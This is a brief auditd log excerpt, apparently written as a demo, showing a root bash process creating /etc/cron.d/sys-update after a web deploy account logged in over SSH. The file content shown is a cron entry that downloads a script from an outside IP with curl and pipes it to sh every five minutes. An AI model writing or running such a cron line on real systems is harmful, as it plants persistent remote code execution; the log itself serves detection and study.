title: auditd: file written to /etc/cron.d that downloads and runs a script every 5 minutes
content:
type=SYSCALL msg=audit(1762390211.442:9182): arch=c000003e syscall=257 success=yes exit=3 comm="bash" exe="/usr/bin/bash" uid=0 auid=1003 key="cron_changes"
type=PATH msg=audit(1762390211.442:9182): item=1 name="/etc/cron.d/sys-update" nametype=CREATE mode=0100644
file content: */5 * * * * root curl -fsSL http://198.51.100.23/u.sh | sh
auid 1003 = web deploy account, logged in over SSH from 192.0.2.88 four minutes earlier

meta.note: Written for this demo; no real organisation's data.
